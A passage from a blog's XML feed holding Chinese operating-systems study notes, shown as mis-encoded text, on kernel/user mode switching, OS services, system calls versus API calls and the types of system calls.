ç¯å¢ƒè¯¦ç»†æ•™ç¨‹ï¼ˆäºŒï¼‰ï¼šcondaå·¥å…·çš„ä½¿ç”¨</a></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿç¬”è®°</title>
    <link href="/posts/8ce3e425/"/>
    <url>/posts/8ce3e425/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -å¯¼è®º"><a class="markdownIt-Anchor" href="#ç¬¬1ç« -å¯¼è®º"></a> ç¬¬1ç«  å¯¼è®º</h1><h2 id="11-æ“ä½œç³»ç»Ÿåšä»€ä¹ˆ"><a class="markdownIt-Anchor" href="#11-æ“ä½œç³»ç»Ÿåšä»€ä¹ˆ"></a> 1.1 æ“ä½œç³»ç»Ÿåšä»€ä¹ˆ</h2><p>è®¡ç®—æœºç³»ç»Ÿå¯ä»¥å¤§è‡´åˆ†ä¸º4ä¸ªç»„æˆéƒ¨åˆ†ï¼šè®¡ç®—æœºç¡¬ä»¶ã€æ“ä½œç³»ç»Ÿã€ç³»ç»Ÿç¨‹åºä¸åº”ç”¨ç¨‹åºå’Œç”¨æˆ·ã€‚</p><p><img src="/posts/8ce3e425/image-20211114101353468.png" alt="image-20211114101353468"></p><p><strong>å®šä¹‰æ“ä½œç³»ç»Ÿ</strong>ï¼š</p><p>æ“ä½œç³»ç»Ÿæ˜¯ä¸€ç›´è¿è¡Œåœ¨è®¡ç®—æœºä¸Šçš„ç¨‹åºï¼ˆé€šå¸¸ç§°ä¸ºå†…æ ¸ï¼‰ï¼Œå…¶ä»–ç¨‹åºåˆ™ä¸ºç³»ç»Ÿç¨‹åºå’Œåº”ç”¨ç¨‹åºã€‚</p><h2 id="12-è®¡ç®—æœºç³»ç»Ÿç»„ç»‡"><a class="markdownIt-Anchor" href="#12-è®¡ç®—æœºç³»ç»Ÿç»„ç»‡"></a> 1.2 è®¡ç®—æœºç³»ç»Ÿç»„ç»‡</h2><p><strong>1.2.1 è®¡ç®—æœºç³»ç»Ÿæ“ä½œ</strong></p><p><strong>1.2.2 å­˜å‚¨ç»“æ„</strong></p><p><img src="/posts/8ce3e425/image-20211114104118324.png" alt="image-20211114104118324"></p><p><strong>1.2.3 I/Oç»“æ„</strong></p><h2 id="13-è®¡ç®—æœºç³»ç»Ÿä½“ç³»ç»“æ„"><a class="markdownIt-Anchor" href="#13-è®¡ç®—æœºç³»ç»Ÿä½“ç³»ç»“æ„"></a> 1.3 è®¡ç®—æœºç³»ç»Ÿä½“ç³»ç»“æ„</h2><p><strong>1.3.1 å•å¤„ç†å™¨ç³»ç»Ÿ</strong></p><p><strong>1.3.2 å¤šå¤„ç†å™¨ç³»ç»Ÿ</strong></p><p><strong>1.3.3 é›†ç¾¤ç³»ç»Ÿ</strong></p><p>ä¸å¤šå¤„ç†å™¨ç³»ç»Ÿä¸€æ ·ï¼Œ é›†ç¾¤ç³»ç»Ÿå°†å¤šä¸ªCPUé›†ä¸­èµ·æ¥å®Œæˆè®¡ç®—ä»»åŠ¡ã€‚ç„¶è€Œï¼Œé›†ç¾¤ç³»ç»Ÿä¸å¤šå¤„ç†å™¨ç³»ç»Ÿä¸åŒï¼Œå®ƒæ˜¯ç”±ä¸¤ä¸ªæˆ–å¤šä¸ªç‹¬ç«‹çš„ç³»ç»Ÿè—•åˆèµ·æ¥çš„ã€‚</p><h2 id="14-æ“ä½œç³»ç»Ÿç»“æ„"><a class="markdownIt-Anchor" href="#14-æ“ä½œç³»ç»Ÿç»“æ„"></a> 1.4 æ“ä½œç³»ç»Ÿç»“æ„</h2><h2 id="15-æ“ä½œç³»ç»Ÿæ“ä½œ"><a class="markdownIt-Anchor" href="#15-æ“ä½œç³»ç»Ÿæ“ä½œ"></a> 1.5 æ“ä½œç³»ç»Ÿæ“ä½œ</h2><p>1.5.1 åŒé‡æ¨¡å¼æ“ä½œ<br>1.5.2 å®šæ—¶å™¨</p><h2 id="16-è¿›ç¨‹ç®¡ç†"><a class="markdownIt-Anchor" href="#16-è¿›ç¨‹ç®¡ç†"></a> 1.6 è¿›ç¨‹ç®¡ç†</h2><h2 id="17-å†…å­˜ç®¡ç†"><a class="markdownIt-Anchor" href="#17-å†…å­˜ç®¡ç†"></a> 1.7 å†…å­˜ç®¡ç†</h2><h2 id="18-å­˜å‚¨ç®¡ç†"><a class="markdownIt-Anchor" href="#18-å­˜å‚¨ç®¡ç†"></a> 1.8 å­˜å‚¨ç®¡ç†</h2><p>1.8.1 æ–‡ä»¶ç³»ç»Ÿç®¡ç†<br>1.8.2 å¤§å®¹é‡å­˜å‚¨å™¨ç®¡ç†<br>1.8.3 é«˜é€Ÿç¼“å­˜<br>1.8.4 V/Oç³»ç»Ÿ</p><h2 id="19-ä¿æŠ¤å’Œå®‰å…¨"><a class="markdownIt-Anchor" href="#19-ä¿æŠ¤å’Œå®‰å…¨"></a> 1.9 ä¿æŠ¤å’Œå®‰å…¨</h2><h2 id="110-åˆ†å¸ƒå¼ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#110-åˆ†å¸ƒå¼ç³»ç»Ÿ"></a> 1.10 åˆ†å¸ƒå¼ç³»ç»Ÿ</h2><h2 id="111-ä¸“ç”¨ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#111-ä¸“ç”¨ç³»ç»Ÿ"></a> 1.11 ä¸“ç”¨ç³»ç»Ÿ</h2><p>1.111 å®æ—¶åµŒå…¥å¼ç³»ç»Ÿ<br>1.11.2 å¤šåª’ä½“ç³»ç»Ÿ<br>1.11.3 æ‰‹æŒç³»ç»Ÿ</p><h2 id="112-è®¡ç®—ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#112-è®¡ç®—ç¯å¢ƒ"></a> 1.12 è®¡ç®—ç¯å¢ƒ</h2><p>1.12.1 ä¼ ç»Ÿè®¡ç®—<br>1.12.2 å®¢æˆ·æœºæœåŠ¡å™¨è®¡ç®—<br>1.12.3 å¯¹ç­‰è®¡ç®—<br>1.12.4 åŸºäºWebçš„è®¡ç®—</p><p><strong>ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€çš„3ç§æ–¹å¼</strong></p><ol><li><p><strong>ç³»ç»Ÿè°ƒç”¨</strong> è¿™æ˜¯ç”¨æˆ·æ€è¿›ç¨‹ä¸»åŠ¨è¦æ±‚åˆ‡æ¢åˆ°å†…æ ¸æ€çš„ä¸€ç§æ–¹å¼ï¼Œç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ç¨‹åºå®Œæˆå·¥ä½œã€‚è€Œç³»ç»Ÿè°ƒç”¨çš„æœºåˆ¶å…¶æ ¸å¿ƒè¿˜æ˜¯ä½¿ç”¨äº†æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç‰¹åˆ«å¼€æ”¾çš„ä¸€ä¸ªä¸­æ–­æ¥å®ç°ï¼Œä¾‹å¦‚Linuxçš„int 80hä¸­æ–­ã€‚</p></li><li><p><strong>å¼‚å¸¸</strong> å½“CPUåœ¨æ‰§è¡Œè¿è¡Œåœ¨ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºæ—¶ï¼Œå‘ç”Ÿäº†æŸäº›äº‹å…ˆä¸å¯çŸ¥çš„å¼‚å¸¸ï¼Œè¿™æ—¶ä¼šè§¦å‘ç”±å½“å‰è¿è¡Œè¿›ç¨‹åˆ‡æ¢åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å†…æ ¸ç›¸å…³ç¨‹åºä¸­ï¼Œä¹Ÿå°±è½¬åˆ°äº†å†…æ ¸æ€ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸ã€‚</p></li><li><p><strong>å¤–å›´è®¾å¤‡çš„ä¸­æ–­</strong> å½“å¤–å›´è®¾å¤‡å®Œæˆç”¨æˆ·è¯·æ±‚çš„æ“ä½œåï¼Œä¼šå‘CPUå‘å‡ºç›¸åº”çš„ä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶CPUä¼šæš‚åœæ‰§è¡Œä¸‹ä¸€æ¡å³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤è½¬è€Œå»æ‰§è¡Œä¸ä¸­æ–­ä¿¡å·å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œå¦‚æœå…ˆå‰æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹è‡ªç„¶ä¹Ÿå°±å‘ç”Ÿäº†ç”±ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ã€‚æ¯”å¦‚ç¡¬ç›˜è¯»å†™æ“ä½œå®Œæˆï¼Œç³»ç»Ÿä¼šåˆ‡æ¢åˆ°ç¡¬ç›˜è¯»å†™çš„ä¸­æ–­å¤„ç†ç¨‹åºä¸­æ‰§è¡Œåç»­æ“ä½œç­‰ã€‚</p></li></ol><h1 id="ç¬¬2ç« -æ“ä½œç³»ç»Ÿç»“æ„"><a class="markdownIt-Anchor" href="#ç¬¬2ç« -æ“ä½œç³»ç»Ÿç»“æ„"></a> ç¬¬2ç«  æ“ä½œç³»ç»Ÿç»“æ„</h1><h2 id="21-æ“ä½œç³»ç»ŸæœåŠ¡"><a class="markdownIt-Anchor" href="#21-æ“ä½œç³»ç»ŸæœåŠ¡"></a> 2.1 æ“ä½œç³»ç»ŸæœåŠ¡</h2><ul><li><p><strong>ç”¨æˆ·ç•Œé¢</strong>ï¼š</p><ul><li>ä¸€ç§æ˜¯å‘½ä»¤è¡Œç•Œé¢ï¼ˆcommand-line interface CLIï¼‰ï¼Œ å®ƒé‡‡ç”¨æ–‡æœ¬å‘½ä»¤ï¼Œ å¹¶ç”¨ä¸€å®šçš„æ–¹æ³•è¾“å…¥ï¼ˆå³ä¸€ç§å…è®¸è¾“å…¥å¹¶ç¼–è¾‘çš„å‘½ä»¤ã€‰ã€‚</li><li>å¦ä¸€ç§æ˜¯æ‰¹ç•Œé¢ï¼Œ å…¶ä¸­æ§åˆ¶è¿™äº›å‘½ä»¤å’Œå‘½ä»¤çš„æŒ‡ä»¤è¢«è¾“å…¥æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æ‰§è¡Œæ–‡ä»¶æ¥å®ç°ã€‚</li><li>æœ€ä¸ºå¸¸ç”¨çš„æ˜¯å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆgraphical user interface,GUI)ï¼Œ æ­¤æ—¶ç•Œé¢æ˜¯ä¸€ä¸ªè§†çª—ç³»ç»Ÿï¼Œ å®ƒå…·æœ‰å®šä½è®¾å¤‡æ¥æŒ‡æŒ¥I/Oã€ä»èœå•æ¥é€‰æ‹©ã€é€‰ä¸­éƒ¨åˆ†å¹¶ç”¨é”®ç›˜è¾“å…¥æ–‡æœ¬ã€‚æœ‰äº›ç³»ç»Ÿè¿˜æä¾›äº†ä¸¤ç§ç”šè‡³æ‰€æœ‰è¿™ä¸‰ç§ç•Œé¢ã€‚</li></ul></li><li><p><strong>ç¨‹åºæ‰§è¡Œ</strong>ï¼š ç³»ç»Ÿå¿…é¡»èƒ½å°†ç¨‹åºè£…å…¥å†…å­˜å¹¶è¿è¡Œç¨‹åºã€‚ç¨‹åºå¿…é¡»èƒ½ç»“æŸæ‰§è¡Œï¼Œ åŒ…æ‹¬æ­£å¸¸æˆ–ä¸æ­£å¸¸ç»“æŸï¼ˆæŒ‡æ˜é”™è¯¯ï¼‰ã€‚</p></li><li><p><strong>I/Oæ“ä½œ</strong>ï¼šè¿è¡Œç¨‹åºå¯èƒ½éœ€è¦I/Oï¼Œè¿™äº›I/O å¯èƒ½æ¶‰åŠæ–‡ä»¶æˆ–è®¾å¤‡ã€‚å¯¹äºç‰¹å®šè®¾å¤‡ï¼Œéœ€è¦ç‰¹å®šçš„åŠŸèƒ½ï¼ˆå¦‚åˆ»å½•CDæˆ–DVDé©±åŠ¨å™¨ï¼Œæˆ–æ¸…å±ï¼‰ã€‚ä¸ºäº†æé«˜æ•ˆç‡å’Œè¿›è¡Œä¿æŠ¤ï¼Œ ç”¨æˆ·é€šå¸¸ä¸èƒ½ç›´æ¥æ§åˆ¶Î½oè®¾å¤‡ã€‚å› æ­¤ï¼Œæ“ä½œç³»ç»Ÿå¿…é¡»æä¾›è¿›è¡ŒI/Oæ“ä½œçš„æ–¹æ³•ã€‚</p></li><li><p><strong>æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</strong>ï¼š æ–‡ä»¶ç³»ç»Ÿç‰¹åˆ«é‡è¦ã€‚å¾ˆæ˜æ˜¾ï¼Œ ç¨‹åºéœ€è¦è¯»å†™æ–‡ä»¶å’Œç›®å½•ï¼Œ ä¹Ÿéœ€è¦æ ¹æ®æ–‡ä»¶åæ¥åˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶ã€æœç´¢ä¸€ä¸ªç»™å®šçš„æ–‡ä»¶ã€åˆ—å‡ºæ–‡ä»¶ä¿¡æ¯ã€‚æœ€åï¼Œæœ‰äº›ç¨‹åºè¿˜åŒ…æ‹¬äº†åŸºäºæ–‡ä»¶æ‰€æœ‰æƒçš„å…è®¸æˆ–æ‹’ç»å¯¹æ–‡ä»¶æˆ–ç›®å½•çš„è®¿é—®ç®¡ç†ã€‚</p></li><li><p><strong>é€šä¿¡</strong>ï¼šåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œä¸€ä¸ªè¿›ç¨‹éœ€è¦ä¸å¦ä¸€ä¸ªè¿›ç¨‹äº¤æ¢ä¿¡æ¯ã€‚è¿™ç§é€šä¿¡æœ‰ä¸¤ç§ä¸»è¦å½¢å¼ã€‚ä¸€ç§æ˜¯å‘ç”Ÿåœ¨åŒä¸€å°è®¡ç®—æœºè¿è¡Œçš„ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´ã€‚å¦ä¸€ç§æ˜¯è¿è¡Œåœ¨ç”±ç½‘ç»œè¿æ¥èµ·æ¥<br>çš„ä¸åŒçš„è®¡ç®—æœºä¸Šçš„è¿›ç¨‹ä¹‹é—´ã€‚é€šä¿¡å¯ä»¥é€šè¿‡å…±äº‹å†²åºæ¥å®ç°ï¼Œä¹Ÿå¯é€šè¿‡ä¿¡æ¯äº¤æ¢æŠ€æœ¯æ¥å®ç°ï¼ˆå¯¹äºæ¶ˆæ¯äº¤æ¢ï¼Œæ¶ˆæ¯åŒ…é€šè¿‡æ“ä½œç³»ç»Ÿåœ¨è¿›ç¨‹ä¹‹é—´ç§»åŠ¨ï¼‰ã€‚</p></li><li><p><strong>é”™è¯¯æ£€æµ‹</strong>ï¼šæ“ä½œç³»ç»Ÿéœ€è¦æ—¶åˆ»çŸ¥é“å¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚</p></li><li><p><strong>èµ„æºåˆ†é…</strong>ï¼šå½“å¤šä¸ªç”¨æˆ·æˆ–å¤šä¸ªä½œä¸šåŒæ—¶è¿è¡Œæ—¶ï¼Œå¿…é¡»ä¸ºæ¯ä¸€ä¸ªåˆ†é…èµ„æºã€‚</p></li><li><p><strong>ç»Ÿè®¡</strong>ï¼šè·Ÿè¸ªè®°å½•é‚£äº›ç”¨æˆ·ä½¿ç”¨äº†å¤šå°‘èµ„æºå’Œä»€ä¹ˆç±»å‹çš„èµ„æºã€‚</p></li><li><p><strong>ä¿æŠ¤å’Œå®‰å…¨</strong>ï¼šå¤šè¿›ç¨‹å¹¶å‘æ‰§è¡Œæ—¶ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸èƒ½å¹²é¢„å¦ä¸€ä¸ªè¿›ç¨‹æˆ–æ“ä½œç³»ç»Ÿæœ¬èº«ã€‚</p></li></ul><h2 id="22-æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢"><a class="markdownIt-Anchor" href="#22-æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢"></a> 2.2 æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢</h2><h3 id="221-å‘½ä»¤è§£é‡Šç¨‹åº"><a class="markdownIt-Anchor" href="#221-å‘½ä»¤è§£é‡Šç¨‹åº"></a> 2.2.1 å‘½ä»¤è§£é‡Šç¨‹åº</h3><p>å…·æœ‰å¤šä¸ªå‘½ä»¤è§£é‡Šç¨‹åºé€‰æ‹©çš„ç³»ç»Ÿä¸­ï¼Œ è§£é‡Šç¨‹åºè¢«ç§°ä¸ºå¤–å£³(Shellï¼‰ã€‚ä¾‹å¦‚ï¼Œåœ¨UNIX å’ŒLinux ç³»ç»Ÿä¸­ï¼Œæœ‰å¤šç§ä¸åŒçš„Shell å¯ä¾›ç”¨æˆ·é€‰æ‹©ï¼ŒåŒ…æ‹¬ï¼šBourne Shellã€C Shellã€Bourne-Again Shellã€Korn Shell ç­‰ã€‚</p><h3 id="222-å›¾å½¢ç”¨æˆ·ç•Œé¢"><a class="markdownIt-Anchor" href="#222-å›¾å½¢ç”¨æˆ·ç•Œé¢"></a> 2.2.2 å›¾å½¢ç”¨æˆ·ç•Œé¢</h3><p>ä¸ç”¨æˆ·é€šè¿‡å‘½ä»¤è¡Œç›´æ¥è¾“å…¥å‘½ä»¤ä¸åŒï¼Œ GUI å…è®¸æä¾›åŸºäºé¼ æ ‡çš„çª—å£å’Œèœå•ç³»ç»Ÿä½œä¸ºæ¥å£ã€‚</p><h2 id="23-ç³»ç»Ÿè°ƒç”¨"><a class="markdownIt-Anchor" href="#23-ç³»ç»Ÿè°ƒç”¨"></a> 2.3 ç³»ç»Ÿè°ƒç”¨</h2><p>ç³»ç»Ÿè°ƒç”¨Csystem callï¼‰æä¾›äº†æ“ä½œç³»ç»Ÿæä¾›çš„æœ‰æ•ˆæœåŠ¡ç•Œé¢ã€‚</p><p>ç³»ç»Ÿè°ƒç”¨æä¾›äº†è¿›ç¨‹ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ¥å£</p><p><strong>ç³»ç»Ÿè°ƒç”¨</strong></p><p>æ“ä½œç³»ç»ŸæœåŠ¡çš„ç¼–ç¨‹æ¥å£<br>é€šå¸¸ç”±é«˜çº§è¯­è¨€ç¼–å†™ï¼ˆCæˆ–C++ï¼‰<br>ç¨‹åºè®¿é—®é€šå¸¸é€šè¿‡é«˜å±‚æ¬¡ çš„APIæ¥å£ï¼ˆCæ ‡å‡†åº“çš„åº“å‡½æ•°ï¼‰è€Œä¸æ˜¯ç›´æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨<br>æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹åº”ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ç¼–å·</p><h3 id="ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°è°ƒç”¨çš„åŒºåˆ«"><a class="markdownIt-Anchor" href="#ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°è°ƒç”¨çš„åŒºåˆ«"></a> <strong>ï¼ï¼ï¼ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°è°ƒç”¨çš„åŒºåˆ«</strong></h3><p><strong>ç³»ç»Ÿè°ƒç”¨</strong></p><ol><li><p>ä½¿ç”¨INTå’ŒIRETæŒ‡ä»¤ï¼Œå†…æ ¸å’Œåº”ç”¨ç¨‹åºä½¿ç”¨çš„æ˜¯ä¸åŒçš„å †æ ˆï¼Œå› æ­¤å­˜åœ¨å †æ ˆçš„åˆ‡æ¢ï¼Œä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨ç‰¹æƒæŒ‡ä»¤æ“æ§è®¾å¤‡</p></li><li><p>ä¾èµ–äºå†…æ ¸ï¼Œä¸ä¿è¯ç§»æ¤æ€§</p></li><li><p>åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ä¸Šä¸‹æ–‡ç¯å¢ƒé—´åˆ‡æ¢ï¼Œå¼€é”€è¾ƒå¤§</p></li><li><p>æ˜¯æ“ä½œç³»ç»Ÿçš„ä¸€ä¸ªå…¥å£ç‚¹</p></li></ol><p><strong>å‡½æ•°è°ƒç”¨</strong></p><ol><li>ä½¿ç”¨CALLå’ŒRETæŒ‡ä»¤ï¼Œè°ƒç”¨æ—¶æ²¡æœ‰å †æ ˆåˆ‡æ¢</li><li>å¹³å°ç§»æ¤æ€§å¥½</li><li>å±äºè¿‡ç¨‹è°ƒç”¨ï¼Œè°ƒç”¨å¼€é”€è¾ƒå°</li><li>ä¸€ä¸ªæ™®é€šåŠŸèƒ½å‡½æ•°çš„è°ƒç”¨</li></ol><h3 id="apiä¸ç³»ç»Ÿè°ƒç”¨"><a class="markdownIt-Anchor" href="#apiä¸ç³»ç»Ÿè°ƒç”¨"></a> APIä¸ç³»ç»Ÿè°ƒç”¨</h3><p><strong>API</strong>æ˜¯å‡½æ•°çš„å®šä¹‰ï¼Œè§„å®šäº†è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œè·Ÿå†…æ ¸æ— ç›´æ¥å…³ç³»ã€‚</p><p><strong>ç³»ç»Ÿè°ƒç”¨</strong>æ˜¯é€šè¿‡ä¸­æ–­å‘å†…æ ¸å‘è¯·æ±‚ï¼Œå®ç°å†…æ ¸æä¾›çš„æŸäº›æœåŠ¡ã€‚</p><p><strong>è”ç³»</strong>ï¼šä¸€ä¸ªAPIå¯èƒ½ä¼šéœ€è¦ä¸€ä¸ªæˆ–å¤šä¸ªç³»ç»Ÿè°ƒç”¨æ¥å®Œæˆç‰¹å®šåŠŸèƒ½ã€‚é€šä¿—ç‚¹è¯´å°±æ˜¯å¦‚æœè¿™ä¸ªapiéœ€è¦è·Ÿå†…æ ¸æ‰“äº¤é“å°±éœ€è¦ç³»ç»Ÿè°ƒç”¨ï¼Œå¦åˆ™ä¸éœ€è¦ã€‚ ç¨‹åºå‘˜è°ƒç”¨çš„æ˜¯APIï¼ˆAPIå‡½æ•°ï¼‰ï¼Œç„¶åé€šè¿‡ä¸ç³»ç»Ÿè°ƒç”¨å…±åŒå®Œæˆå‡½æ•°çš„åŠŸèƒ½ã€‚</p><p>APIæ˜¯ä¸€ä¸ªæä¾›ç»™åº”ç”¨ç¨‹åºçš„æ¥å£ï¼Œä¸€ç»„å‡½æ•°ï¼Œæ˜¯ä¸ç¨‹åºå‘˜è¿›è¡Œç›´æ¥äº¤äº’çš„ã€‚ ç³»ç»Ÿè°ƒç”¨åˆ™ä¸ä¸ç¨‹åºå‘˜è¿›è¡Œäº¤äº’çš„ï¼Œå®ƒæ ¹æ®APIå‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªè½¯ä¸­æ–­æœºåˆ¶å‘å†…æ ¸æäº¤è¯·æ±‚ï¼Œä»¥è·å–å†…æ ¸æœåŠ¡çš„æ¥å£ã€‚</p><p>å¹¶ä¸æ˜¯æ‰€æœ‰çš„APIå‡½æ•°éƒ½ä¸€ä¸€å¯¹åº”ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚ä¸€ä¸ªAPIå‡½æ•°å¯èƒ½éœ€è¦å‡ ä¸ªç³»ç»Ÿè°ƒç”¨æ¥å…±åŒå®Œæˆå‡½æ•°çš„åŠŸèƒ½ã€‚ä¸€äº›APIå‡½æ•°ä¸éœ€è¦è°ƒç”¨ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå› æ­¤å®ƒæ‰€å®Œæˆçš„ä¸æ˜¯å†…æ ¸æä¾›çš„æœåŠ¡ï¼‰</p><p><img src="/posts/8ce3e425/image-20211114112604666.png" alt="image-20211114112604666"></p><h2 id="24-ç³»ç»Ÿè°ƒç”¨ç±»å‹"><a class="markdownIt-Anchor" href="#24-ç³»ç»Ÿè°ƒç”¨ç±»å‹"></a> 2.4 ç³»ç»Ÿè°ƒç”¨ç±»å‹</h2><h3 id="241-è¿›ç¨‹æ§åˆ¶"><a class="markdownIt-Anchor" href="#241-è¿›ç¨‹æ§åˆ¶"></a> 2.4.1 è¿›ç¨‹æ§åˆ¶</h3><ul><li>ç»“æŸï¼Œ æ”¾å¼ƒ</li><li>è£…å…¥ï¼Œ æ‰§è¡Œ</li><li>åˆ›å»ºè¿›ç¨‹ï¼Œ ç»ˆæ­¢è¿›ç¨‹</li><li>å–å¾—è¿›ç¨‹å±æ€§ï¼Œ è®¾ç½®è¿›ç¨‹å±æ€§</li><li>ç­‰å¾…æ—¶é—´</li><li>ç­‰å¾…äº‹ä»¶ï¼Œ å”¤é†’äº‹ä»¶</li><li>åˆ†é…å’Œé‡Šæ”¾å†…å­˜</li></ul><h3 id="242-æ–‡ä»¶ç®¡ç†"><a class="markdownIt-Anchor" href="#242-æ–‡ä»¶ç®¡ç†"></a> 2.4.2 æ–‡ä»¶ç®¡ç†</h3><ul><li>åˆ›å»ºæ–‡ä»¶ï¼Œ åˆ é™¤æ–‡ä»¶</li><li>æ‰“å¼€ï¼Œ å…³é—­</li><li>è¯»ã€å†™ã€é‡å®šä½</li><li>å–å¾—æ–‡ä»¶å±æ€§ï¼Œ è®¾ç½®æ–‡ä»¶å±æ€§</li></ul><h3 id="243-è®¾å¤‡ç®¡ç†"><a class="markdownIt-Anchor" href="#243-è®¾å¤‡ç®¡ç†"></a> 2.4.3 è®¾å¤‡ç®¡ç†</h3><ul><li>è¯·æ±‚è®¾å¤‡ï¼Œ é‡Šæ”¾è®¾å¤‡</li><li>è¯»ã€å†™ã€é‡å®šä½</li><li>å–å¾—è®¾å¤‡å±æ€§ï¼Œ è®¾ç½®è®¾å¤‡å±æ€§</li><li>é€»è¾‘è¿æ¥æˆ–æ–­å¼€è®¾å¤‡</li></ul><h3 id="244-ä¿¡æ¯ç»´æŠ¤"><a class="markdownIt-Anchor" href="#244-ä¿¡æ¯ç»´æŠ¤"></a> 2.4.4 ä¿¡æ¯ç»´æŠ¤</h3><ul><li>è¯»å–æ—¶é—´æˆ–æ—¥æœŸï¼Œ è®¾ç½®æ—¶é—´æˆ–æ—¥æœŸ</li><li>è¯»å–ç³»ç»Ÿæ•°æ®ï¼Œ è®¾ç½®ç³»ç»Ÿæ•°æ®</li><li>è¯»å–è¿›ç¨‹ï¼Œ æ–‡ä»¶æˆ–è®¾å¤‡å±æ€§</li><li>è®¾ç½®è¿›ç¨‹ï¼Œ æ–‡ä»¶æˆ–è®¾å¤‡å±æ€§</li></ul><h3 id="245-é€šä¿¡"><a class="markdownIt-Anchor" href="#245-é€šä¿¡"></a> 2.4.5 é€šä¿¡</h3><ul><li>åˆ›å»ºï¼Œ åˆ é™¤é€šä¿¡è¿æ¥</li><li>å‘é€ï¼Œ æ¥å—æ¶ˆæ¯</li><li>ä¼ é€’çŠ¶æ€æ¶ˆæ¯</li><li>è¿æ¥æˆ–æ–­å¼€è¿œç¨‹è®¾å¤‡</li></ul><h2 id="25-ç³»ç»Ÿç¨‹åº"><a class="markdownIt-Anchor" href="#25-ç³»ç»Ÿç¨‹åº"></a> 2.5 ç³»ç»Ÿç¨‹åº</h2><p>ç³»ç»Ÿç¨‹åºæä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„ç¯å¢ƒï¼Œ ä»¥å¼€å‘ç¨‹åºå’Œæ‰§è¡Œç¨‹åºã€‚å…¶ä¸­ä¸€å°éƒ¨åˆ†åªæ˜¯ç³»ç»Ÿè°ƒç”¨çš„ç®€å•æ¥å£ï¼Œ å…¶ä»–çš„å¯èƒ½æ˜¯ç›¸å½“å¤æ‚çš„ã€‚å®ƒä»¬å¯åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼š</p><ul><li><strong>æ–‡ä»¶ç®¡ç†</strong>ï¼šè¿™äº›ç¨‹åºåˆ›å»ºã€åˆ é™¤ã€å¤åˆ¶ã€é‡æ–°å‘½åã€æ‰“å°ã€è½¬å‚¨ã€åˆ—å‡ºå’Œæ“ä½œæ–‡ä»¶å’Œç›®å½•ã€‚</li><li><strong>çŠ¶æ€ä¿¡æ¯</strong>ï¼šä¸€äº›ç¨‹åºä»ç³»ç»Ÿé‚£é‡Œå¾—åˆ°æ—¥æœŸã€æ—¶é—´ã€å¯ç”¨å†…å­˜æˆ–ç£ç›˜ç©ºé—´çš„æ•°é‡ã€ç”¨æˆ·æ•°æˆ–ç±»ä¼¼çŠ¶æ€ä¿¡æ¯ã€‚å¦ä¸€äº›æ›´ä¸ºå¤æ‚ï¼Œ èƒ½æä¾›è¯¦ç»†çš„æ€§èƒ½ã€ç™»å½•å’Œè°ƒè¯•ä¿¡æ¯ã€‚é€šå¸¸ï¼Œ è¿™äº›ä¿¡æ¯ç»æ ¼å¼åŒ–åï¼Œå†æ‰“å°åˆ°ç»ˆç«¯ã€è¾“å‡ºè®¾å¤‡æˆ–æ–‡ä»¶ï¼Œ æˆ–åœ¨GUIçš„çª—ä½“ä¸Šæ˜¾ç¤ºã€‚æœ‰äº›ç³»ç»Ÿè¿˜æ”¯æŒæ³¨å†Œè¡°ï¼Œå®ƒè¢«ç”¨äºå­˜å‚¨å’Œæ£€ç´¢é…ç½®ä¿¡æ¯ã€‚</li><li><strong>æ–‡ä»¶ä¿®æ”¹</strong>ï¼šï¼ 